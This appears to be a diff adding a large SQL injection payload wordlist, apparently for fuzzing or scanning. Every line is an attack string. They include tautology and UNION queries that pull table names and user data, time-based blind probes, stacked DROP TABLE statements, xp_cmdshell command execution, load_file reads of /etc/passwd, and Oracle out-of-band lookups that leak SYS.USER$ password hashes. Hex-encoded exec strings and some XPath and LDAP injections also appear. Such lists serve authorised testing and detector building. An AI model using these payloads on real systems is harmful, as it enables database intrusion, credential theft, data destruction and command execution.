@@ -1,0 +1,689 @@
+2 and 456=678
+2 or 345=345
+2 order by 9999
+2 order by 1
+2/0 and 456=678
+2/1 or 345=345
+2/*f*/and/*f*/456=678
+2/*f*/or/*f*/345=345
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'-- #
+a' or 'dfth'='dfth'-- #
+a' order by 9999-- #
+a' order by 1-- #
+a'and/*g*/456=678-- #
+a'or/*g*/345=345-- #
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'#
+a' or 'dfth'='dfth'#
+a' order by 9999#
+a' order by 1#
+a'||/**/456=678#
+a'||/**/345=345#
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'--
+a' or 'dfth'='dfth'--
+a' order by 9999--
+a' order by 1--
+a'and/*d*/456=678--
+a'or/*d*/345=345--
+a' and '456'='678
+a' or '345'='345
+a' and 'fghi'='fghj'-- #
+a' or 'dfth'='dfth'-- #
+a' order by 9999-- #
+a' order by 1-- #
+a'and/*g*/456=678-- #
+a'or/*g*/345=345-- #
+345'%5d|//*|/a%5b'a
+456'%5d|//a|/a%5b'a
+345')%5d|//*|/a%5bcontains(a,'b
+456')%5d|//a|/a%5bcontains(a,'b
+a" and "456"="678
+a" or "345"="345
+a" and "fghi"="fghj"-- #
+a" or "dfth"="dfth"-- #
+a" order by 9999-- #
+a" order by 1-- #
+a"and/*g*/456=678-- #
+a"or/*g*/345=345-- #
+345"%5d|//*|/a%5b"a
+456"%5d|//a|/a%5b"a
+345")%5d|//*|/a%5bcontains(a,"b
+456")%5d|//a|/a%5bcontains(a,"b
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
+1 waitfor delay '0:0:X'--
+1; waitfor delay '0:0:X'--
+1'; waitfor delay '0:0:X'--
+1); waitfor delay '0:0:X'--
+1)); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1')); waitfor delay '0:0:X'--
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
+a%27%2B%27b
+' OR 1='1
+X' != 'Y' = 0 = '1
+X' = 'X' = 0 = '1
+X' = 'X' = 'X' = 0 = '1
+X' - 'Y' - 0 = '1
+1--
+1 --
+1  --
+1/*
+1 /*
+1  /*
+1*1--
+1 * 1--
+1 * 1 --
+1*1/*
+1 * 1/*
+1 * 1 /*
+1 * 1  /*
+@version--
+@@version--
+@version --
+@version /*
+@version/*
+(select id from users limit 1,1)
+(select id-0 from users limit 1,1)
+'1' union (select id from users limit 1,1)
+1 union (select id from users limit 1,1)
+xxx union (select id from users limit 1,1)
+@version union (select id from users limit 1,1)
+'1' union (select 1 from users limit 1,1)
+1 union (select 1 from users limit 1,1)
+xxx union (select 1 from users limit 1,1)
+@version union (select 1 from users limit 1,1)
+'1' union (select xxx from users limit 1,1)
+1 union (select xxx from users limit 1,1)
+xxx union (select xxx from users limit 1,1)
+@version union (select xxx from users limit 1,1)
+'1' union (select 's' from users limit 1,1)
+1 union (select 's' from users limit 1,1)
+xxx union (select 's' from users limit 1,1)
+@version union (select 's' from users limit 1,1)
+-1 union(((select table_name from information_schema.tables limit 1,1)))
+'1' union(((select table_name from information_schema.tables limit 1,1)))
+@foo union(((select table_name from information_schema.tables limit 1,1)))
+id union(((select table_name from information_schema.tables limit 1,1)))
+test'-1/1/**/union(select table)
+test'-1 union(select table)
+test'-@version union (select table)
+test'-'xyz' union (select table)
+1- @version union(select table_name from information_schema.tables limit 1,1)
+1- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+1- union(select table_name from information_schema.tables limit 1,1)
+@version - @version union(select table_name from information_schema.tables limit 1,1)
+@version- 'xxx' union(select table_name from information_schema.tables limit 1,1)
+@version - 5 union(select table_name from information_schema.tables limit 1,1)
+1 into outfile 'asd'
+1 into outfile 'asd'--
+'1' into outfile 'asd'
+'1' into outfile 'asd' --
+@version into outfile 'asd'
+@version into outfile 'asd' --
+1 into outfile ('asd')
+'1' into outfile ('asd')
+@version into outfile ('asd')
+1 into outfile substring('asd', 10, 1)
+'1' into outfile substring('asd', 10, 1)
+@version into outfile substring('asd', 10 1)
+1 into outfile (substring('asd', 10, 1))
+'1' into outfile (substring('asd', 10, 1))
+@version into outfile (substring('asd', 10 1))
+%28select+substr%0D%0A%28login%0D%0A%0D%0A%29%0D%0Afrom+users+limit+1%2C1%29
+union%20%28select+id+from+users+limit+1%2C1%29
+1%0Aand+current_user=notthere()
+1%0Aand+current_user=1
+1%0Aand+current_user=@version
+1%0Aand+current_user='junk'
+1%0Aand+current_user=foo
+1--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+@version--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+
+-.1a%20union%20%28select+id+from+users+limit+1%2C1%29
+
+case 1 when 2 then 2 end
+case sin(1) when 2 then 2 end
+case '1' when 2 then 2 end
+case 1 when 's' then 2 end
+case when 2 then 3 end
+case when 's' then 3 end
+case when f(1) then 3 end
+
+-1 union select table_name asda from information_schema.tables
+-1 union select table_name "asda" from information_schema.tables
+-1 union select table_name `asda` from information_schema.tables
+-1 union select table_name as asda from information_schema.tables
+-1 union select table_name as "asda" from information_schema.tables
+-1 union select table_name as `asda` from information_schema.tables
+
+a'and(select(binary(/*!system_user()*/)))like'reading%25
+
+-1 union select @``"", table_name from information_schema.tables
+'foo' union select @``"", table_name from information_schema.tables
+@version union select @``"", table_name from information_schema.tables
+
+select @version foo
+select @version "foo"
+select @version foo -- junk
+select @version "foo" -- junk
+_latin1'foo' union select * from foo
+_LATIN7'foo' union select * from foo
+_utf8'foo' union select * from foo
+
+REAL 1 union select * from foo
+1::REAL union select * from foo
+1::REAL::REAL union select * from foo
+
+-1 union select @``"", table_name from information_schema.tables
+!~1 union select table_name from information_schema.tables
+-1 union select @a`from 1`, table_name from information_schema.tables
+version() union select table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+1 is unknown union select table_name from information_schema.tables
+true is not unknown for update union select table_name from information_schema.tables
+1 for update union select 1
+(true)-(true)union select table_name from information_schema.tables
+(@a)-(@a)union select table_name from information_schema.tables
+1 OR (1 OR 1)--
+(1) OR (1 OR 1)--
+((1) OR (1 OR 1))--
+((1) OR ((1 OR 1)))--
+1 OR ((1 OR 1)) --
+1 OR ((1) OR 1) --
+1'=sleep(1)='1
+1=1 AND-+-+-+-+~~((1))
+b'1' UNION SELECT 1
+x'1' UNION SELECT 1
+n'1' UNION SELECT 1
+1 having 1 limit 1 union select 1--
+1 having (1) limit 1 union select 1--
+1 having -(1) limit 1 union select 1--
+1 having sin(1) limit 1 union select 1--
+1 having 1 limit 2 group by 3 union select 1--
+1 group by 2 union select 1 --
+sin(1) group by 1 union select 1--
+@version group by 1 union select 1--
+@version group by (-1) union select 1--
+(@version) group by -1 union select 1--
+(@version) group by (-1) union select 1--
+(@version)) group by (-1) union select 1--
+(1)) group by (-1) union select 1--
+(@version) group by sin(-1) union select 1--
+1 group by sin(1) union select 1--
+1 group by 1 - sin(1) union select 1--
+1 group by (sin(1)) union select 1--
+-1 group by -(-sin(1)) union select 1--
+sin(1) group by (-sin(1)) union select 1--
+sin(1)-1 group by (-sin(1)) union select 1--
+sin(1)-1 group by 1 union select 1--
+1 group by ((1)) union select 1--
+1 group by (((1))) union select 1--
+((1)) group by (1) union select 1--
+(1) group by ((1)) union select 1--
+(1) group by (1) union select 1--
+-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update  UNION select table_name from information_schema.tables limit 1
+1 for update UNION select table_name from information_schema.tables limit 1
+-(1) for update UNION select table_name from information_schema.tables limit 1
+-(true) for update UNION select table_name from information_schema.tables limit 1
+-(null) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update having true UNION select table_name from information_schema.tables limit 1
+-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1
+-(1) having 1 for update UNION select table_name from information_schema.tables limit 1
+
+\''; DROP TABLE users; --
+\''); DROP TABLE users; --
+\''; /* one */ ;DROP TABLE users; --
+\''; select 1; drop table users; --
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+
+-1 - (select (1 - select (select 1))) union all select 2 --
+-1 - (select 1) - union all select 2 --
+(select 1) - 1 union all select 2 --
+((select 1) - 1) + (select 1) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (select ((select 1))) union all select 2 --
+(select ((select 1 - (select 1))) union all select 2 --
+(select (select (((select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (((select (select 1))) union all select 2 --
+(select (select (1 - select 1))) union all select 2 --
+(select (select 1 - (select 1))) union all select 2 --
+(select 1 - (select 1 - (select 1))) union all select 2 --
+
+-1 union distinct select table_name from information_schema.tables
+-1 union distinct all select table_name from information_schema.tables
+-1 union all distinct select table_name from information_schema.tables
+-1 union all select table_name from information_schema.tables
+
+if(1, -1, 2) union select table_name from information_schema.tables limit 1
+if((1), -1, 2) union select table_name from information_schema.tables limit 1
+if(1=2, -1, 2) union select table_name from information_schema.tables limit 1
+true in(2, (select 2)) union select table_name from information_schema.tables limit 1
+true in(2, 1) union select table_name from information_schema.tables limit 1
+
+if(1, 1, 2) union select 3
+if(sin(1), 1, 2) union select 3
+if(1, sin(1), 2) union select 3
+if(1 - sin(1), 2) union select 3
+if((1), 1, 2) union select 3
+if(-(1), 1, 2) union select 3
+
+1; if exists ( /* anything */
+
+'s' || binary(1)# and n='foo"
+1 - binary (1 - binary(1)) UNION SELECT 2 --
+1 - binary (binary(1) -1) UNION SELECT 2 --
+binary (1 - binary(1)) UNION SELECT 2 --
+binary (binary(1) - 1) UNION SELECT 2 --
+binary (binary(1)) UNION SELECT 2 --
+
+(1 between @version and "2") & 1 UNION SELECT 1
+(1 between @version and @user) & 1 UNION SELECT 1
+(1 between 1 and @version) & 1 UNION SELECT 1
+(1 between '1' and @version) & 1 UNION SELECT 1
+(1 between 1 and 2) & 1 UNION SELECT 1
+(1 between '1' and '2') & 1 UNION SELECT 1
+(1 between 1 and '2') & 1 UNION SELECT 1
+(1 between '1' and 2) & 1 UNION SELECT 1
+('1' between '1' and '2') & 1 UNION SELECT 1
+(@version between '1' and '2') & 1 UNION SELECT 1
+(@version between 1 and '2') & 1 UNION SELECT 1
+
+1 - ANY(SELECT 1,2)
+ANY(SELECT 1) - 1 UNION ALL --
+ANY(SELECT (1)) - 1 UNION ALL --
+ANY((SELECT 1)) - 1 UNION ALL --
+1 - ANY(SELECT 1) UNION ALL --
+
+1%A0UNION%A0SELECT%A02--
+1%00UNION%00SELECT%002--
+
+-{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
+
+1' and 1=(select count(*) from tablenames); --
+
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' or 1=1-- 
+or 1=1
+' or '1'='1
+; or '1'='1'
+" or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- 
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+admin' or '
+' select * from information_schema.tables--
+) union select * from information_schema.tables;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' or 'unusual' = 'unusual'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'something' like 'some%'
+' or 2 > 1
+' or 'text' > 't'
+' or 'whatever' in ('whatever')
+' or 2 between 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+password:*/=1--
+uni/**/on sel/**/ect
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; exec ('sel' + 'ect us' + 'er')
+'/**/or/**/1/**/=/**/1
+' or 1/*
+ or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- &password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+create user name identified by 'pass123'
+create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+sleep(9999)
+)-sleep(9999
+1337%20INTO%20OUTFILE%20‘xxx’--
+1337)%20INTO%20OUTFILE%20‘xxx’--
+123;DROP%20TABLE%20users--
+123);DROP%20TABLE%20users--
+)%20OR%20(SELECT%20password%20FROM%20users%20...
+*/UNION%20SELECT%20password%20FROM%20users--
+)%20or%20('x'='x
+%20or%201=1
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+"hi"") or (""a""=""a"
+delete
+like
+" or sleep(__TIME__)#
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+insert
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+*|
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+asc
+(||6)
+"a"" or 3=3--"
+" or benchmark(10000000,MD5(1))#
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+or a = a
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+0
+21 %
+limit
+ or 1=1
+ or 2 > 1
+")) or benchmark(10000000,MD5(1))#
+PRINT
+hi') or ('a'='a
+ or 3=3
+ or%201=1
+1 or sleep(__TIME__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 'text' = n'text'
+ --
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+exec xp
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+3.10E+17
+" or pg_sleep(__TIME__)--
+x' AND email IS NULL; --
+&
+admin' or '
+ or 'unusual' = 'unusual'
+//
+truncate
+1) or benchmark(10000000,MD5(1))#
+\x27UNION SELECT
+||6
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+or a=a
+) union select * from information_schema.tables;
+PRINT @@variable
+or isNULL(1/0) /*
+26 %
+" or "a"="a
+%20'sleep%2050'
+/**/or/**/1/**/=/**/1
+ union all select @@version--
+ %20or%20''='
+hi' or 'x'='x';
+") or sleep(__TIME__)="
+ or 'whatever' in ('whatever')
+  union select
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or a=a--
+ or '1'='1
+|
+ or sleep(__TIME__)='
+ or 1 --'
+or 0=0 #"
+having
+a'
+" or isNULL(1/0) /*
+char%4039%41%2b%40SELECT
+" or 1=1--
+x' AND userid IS NULL; --
+*/*
+ or 'text' > 't'
+ (select top 1
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+a' or 3=3--
+ -- &password=
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+select
+")) or sleep(__TIME__)="
+0x730065006c0065006300740020004000400076006500 ...
+hi' or 1=1 --
+%20or%20'x'='x
+ or 'something' = 'some'+'thing'
+exec sp
+29 %
+0 or 1=1
+) or (a=a
+uni/**/on sel/**/ect
+replace
+%27%20or%201=1
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+&apos;%20OR
+; or '1'='1'
+1 or 1=1
+; exec ('sel' + 'ect us' + 'er')
+23 OR 1=1
+/
+anything' OR 'x'='x
+or 0=0 --
+desc
+||'6
+)
+or 0=0 #
+hi or a=a
+*(|(mail=*))
+password:*/=1--
+distinct
+to_timestamp_tz
+") or benchmark(10000000,MD5(1))#
+ UNION SELECT
+%2A%28%7C%28mail%3D%2A%29%29
++sqlvuln
+ or 1=1 /*
+)) or sleep(__TIME__)='
+or 1=1 or ""=
+ or 1 in (select @@version)--
+ x' or 1=1 or 'x'='y
+28 %
+ or '1'='1'--
+"a"" or 1=1--"
+//*
+%2A%7C
+" or 0=0 --
+?
+ or 1/*
+!
+'
+ or a = a
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or 1=1
+ or 1=1 --
+x' OR full_name LIKE '%Bob%
